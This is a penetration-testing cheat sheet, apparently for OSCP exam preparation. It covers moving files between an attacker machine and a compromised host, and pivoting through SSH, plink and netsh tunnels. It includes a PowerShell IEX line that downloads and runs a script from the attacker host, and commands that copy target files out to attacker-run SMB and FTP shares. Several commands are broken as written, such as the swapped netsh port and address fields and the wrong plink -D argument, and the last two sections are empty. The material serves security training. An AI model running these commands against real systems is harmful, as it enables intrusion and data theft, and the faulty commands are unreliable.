# OSCP Cheat Sheet by 0xpr0N3rd

## File Transfers

**Method 1 (SMB Server) | Windows -> Linux**

On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):

```
[SHARE_NAME]
   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes
```

Second, again on **LOCAL**, set up the server:

```
# smbserver.py <SHARE_NAME> $(pwd) -port <LPORT>          <- Port is optional

or

# impacket-smbserver <SHARE_NAME> $(pwd) -port <LPORT>    <- Port is optional
```

On **TARGET**:

```
PS C:\> copy <FILE_NAME> \\<LHOST>\<SHARE_NAME>\<OUTPUT_FILE_NAME>
```

-------------------------------------------------------------

**Method 2 (Web ROOT) | Windows -> Linux**

If you have the permission for copying the file to the webroot, copy the file to the server & download the file on **LOCAL**.

-------------------------------------------------------------

**Method 3 (FTP, works almost EVERYTIME) | Windows -> Linux**

On **LOCAL**:

```
# pip install pyftpdlib

# python -m pyftpd -p 21 -w         <- "-w" flag enables anonymous write permission
```

On **TARGET**:

```
PS C:\> C:\Windows\System32\ftp.exe
ftp> open <LHOST>
ftp> user anonymous
ftp> password <BLANK>
ftp> put <FILE_NAME>
```

-------------------------------------------------------------

**Method 4 (SMB Server) | Linux -> Windows**

On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):

```
[SHARE_NAME]
   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes
```

Second, on **LOCAL**:

```
# smbserver.py <SHARE_NAME> . -smb2support               <- if gives error, try installing impacket again: pip3 install . (in impacket folder)

or

# impacket-smbserver <SHARE_NAME> $(pwd) -smb2support -user <USENAME> -password <PASSWORD>      <- username, password & smb2support flags are optional
```

On **TARGET**:

```
PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('test', $pass)
PS C:\> New-PSDrive -Name "<SHARE_NAME>" -PSProvider "FileSystem" -Root "\\<LHOST>\<SHARE_NAME>" -Credential $cred


PS C:\> net use \\<LHOST>\<SHARE_NAME>
PS C:\> net use copy \\<LHOST>\<SHARE_NAME>\<FILE_NAME>
```

-------------------------------------------------------------

**Method 5 (Standard IEX) | Linux -> Windows**

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
PS C:\> IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/<FILE_NAME>')
PS C:\> Get-ChildItem -Path C:\ -Include <FILE_NAME> -Recurse        <- Find downloaded file (recursively)
```

-------------------------------------------------------------

**Method 6 (Powershell) | Linux -> Windows**

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
PS C:> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOST>:<LPORT>/<FILE_NAME>', 'C:\Users\Public\Downloads\<FILE_NAME>')"
```

-------------------------------------------------------------

**Method 7 (Browser) | Linux -> Windows**

If there's a RDP or VNC connection, use browser on navigating the files.

-------------------------------------------------------------

**Method 8 (Standard wget) | Linux -> Linux**

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
# wget http://<LHOST>:<LPORT>/<FILE_NAME>
```

-------------------------------------------------------------

**Method 9 (SCP) | Linux -> Linux**

On **LOCAL**:

```
# scp <FILE_NAME> <USERNAME>@<RHOST>:/<REMOTE_DIR>
```

-------------------------------------------------------------

**Method 10 (Socat) | Linux -> Linux**

On **LOCAL**:

```
# socat TCP4-LISTEN:<LPORT>,fork file:<FILE_NAME>
```

On **TARGET**:

```
# socat TCP4:<LHOST>:<LPORT> file:<FILE_NAME>, create
```

-------------------------------------------------------------

## Port Forwarding w/ProxyChains | UNIX

**First**, on **LOCAL** set up ``/etc/proxychains.conf`` file:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 <LISTEN_PORT>
```

**Second**, on **LOCAL**, do the **Dynamic** port forwarding. This forwards all target ports through the tunnel to our local:

```
# ssh -f -N -D 127.0.0.1:<LISTEN_PORT> <USERNAME>@<RHOST>
```

**Third**, for instance, to perform **NMAP** through the tunnel, do:

```
# proxychains -q nmap -sV -Pn --top-ports 20 -sC -sT -vv <RHOST>        <- Remember "-sT" flag is a must since nmap can only scan TCP ports through proxychains 
```

**NOTE:**

- If **NMAP** scan would take too long, just do:

```
# nc -nvv -w 1 -z 10.1.1.224 1-65535
```

from the **PIVOTED** box to perform a netcat port scan.

**NOTE 2:**

- If both ``proxychains`` and ``nc`` would take too long, try to upload **[nmap static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)** to the **PIVOT** box and run **nmap**.

**Fourth**, to perform **GOBUSTER** scan, do:

```
# gobuster dir -p socks5://127.0.0.1:<LISTEN_PORT> -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x <EXTENSIONS> -t 200
```

**Fifth**, to perform **WFUZZ**, do:

```
# wfuzz -p 127.0.0.1:<LISTENPORT>:SOCKS5 -c -w <WORDLIST> --hc 404 http://<RHOST>:<RPORT>/FUZZ   <- If there's an error, use SOCKS4 (configure SOCKS4 also)
```

**Sixth**, to redirect tunneled traffic on the **BROWSER**, do:

1. Open **FoxyProxy** settings
2. Select **Proxy Type** as ``SOCKS4`` or ``SOCKS5``
3. Select **Proxy IP address** as ``127.0.0.1``
4. Select **Port** as ``<LISTEN_PORT>``

-------------------------------------------------------------

## Port Forwarding w/PLINK.exe | Windows

***Upload*** ``plink.exe`` ***to the box. Preferably, under*** ``C:\Public\Downloads\`` ***location.***

**SOCKS-based Dynamic Port Forwarding**

```
C:\> plink.exe -N -D 127.0.0.1:<LHOST> -P <SSH PORT> <RHOST>
```

**Forward local host to remote address:**

```
C:\> plink.exe -ssh -l <REMOTE_SSH_USERNAME> -pw <PASSWORD> <RHOST>:<RPORT>:127.0.0.1:<LPORT> <RHOST>
```

**Forward local when a dedicated SOCKS proxy server is available:**

```
C:\> plink.exe -N -L <LHOST>:<SOCKS_IP>:<SOCKS_PORT>
```

**Remote Port Forwarding:**

```
C:\> plink.exe -N -R <LPORT>:127.0.0.1:<RPORT> -P 22 <RHOST>
```

**Nmap:**

```
# nmap -sS -sV 127.0.0.1 -p <PORT>
```

-------------------------------------------------------------

## Port Forwarding w/NETSH.exe | Windows

**Establish connection:**

```
C:\> netsh interface portproxy add v4tov4 listenport=<LHOST> listenaddress=<LPORT> connectport=<RPORT> connectaddress=<RHOST>
```

**Check routing table *(from CMD, not PS)*:**

```
C:\> netstat -anp TCP | find <LPORT>
```

**Add firewall:**

```
C:\> netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<RHOST> localport=<RPORT> action=allow
```

-------------------------------------------------------------

## HTTP Tunnelling Through Deep Packet Inspection

-------------------------------------------------------------

## Port Forwarding w/Metasploit 



